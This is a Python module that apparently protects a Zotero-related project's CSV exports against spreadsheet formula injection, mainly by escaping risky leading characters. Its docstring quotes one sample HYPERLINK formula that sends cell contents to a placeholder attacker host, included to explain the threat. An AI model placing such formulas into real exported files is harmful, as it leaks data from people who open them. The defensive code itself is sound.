"""
Shared CSV formula-injection guard (Issue #237). Every CSV export in this
project writes Zotero item fields (title, abstract, notes, etc.) straight
into cells - any collaborator with write access to a shared library can
set a title/field beginning with "=", "+", "-", or "@" (e.g.
`=HYPERLINK("http://attacker/?"&A1,"x")`), which Excel/LibreOffice/Google
Sheets can evaluate as a formula when a reviewer opens the exported file.
"""

from typing import Any, Dict, Iterable, List, Sequence, TypeVar, Union, overload

_DANGEROUS_PREFIXES = ("=", "+", "-", "@", "\t", "\r")

_RowT = TypeVar("_RowT", Dict[str, Any], List[Any])


def sanitize_csv_cell(value: Any) -> Any:
    """Prefixes a string value with a leading `'` if it starts with a
    character a spreadsheet application could interpret as a formula
    (or tab/CR, which some parsers also treat specially) - matches
    OWASP's recommended CSV-injection mitigation. Non-string values pass
    through unchanged."""
    if isinstance(value, str) and value.startswith(_DANGEROUS_PREFIXES):
        return "'" + value
    return value


@overload
def sanitize_csv_row(row: Dict[str, Any]) -> Dict[str, Any]: ...
@overload
def sanitize_csv_row(row: Sequence[Any]) -> List[Any]: ...
def sanitize_csv_row(row: Union[Dict[str, Any], Sequence[Any]]) -> Union[Dict[str, Any], List[Any]]:
    """Sanitizes every cell in one row, preserving its shape - a dict for
    csv.DictWriter, a list/tuple for csv.writer."""
    if isinstance(row, dict):
        return {key: sanitize_csv_cell(value) for key, value in row.items()}
    return [sanitize_csv_cell(value) for value in row]


def sanitize_csv_rows(rows: Iterable[_RowT]) -> List[_RowT]:
    """sanitize_csv_row applied to every row in an iterable - the input
    rows must be uniformly all-dict or all-list/tuple."""
    return [sanitize_csv_row(row) for row in rows]  # type: ignore[misc]


def unsanitize_csv_cell(value: Any) -> Any:
    """
    Reverses sanitize_csv_cell's leading `'` for formats that are both
    written and re-read by this project (e.g. the canonical CSV
    import/export format) - without this, re-importing a file this
    project itself exported would treat the escape marker as literal
    data. Only strips the *single* leading quote sanitize_csv_cell adds;
    a value a user genuinely started with `'` themselves is preserved as
    entered (indistinguishable from - and no worse than - any other CSV
    round-trip through a spreadsheet application).
    """
    if isinstance(value, str) and value.startswith("'") and value[1:].startswith(
        _DANGEROUS_PREFIXES
    ):
        return value[1:]
    return value
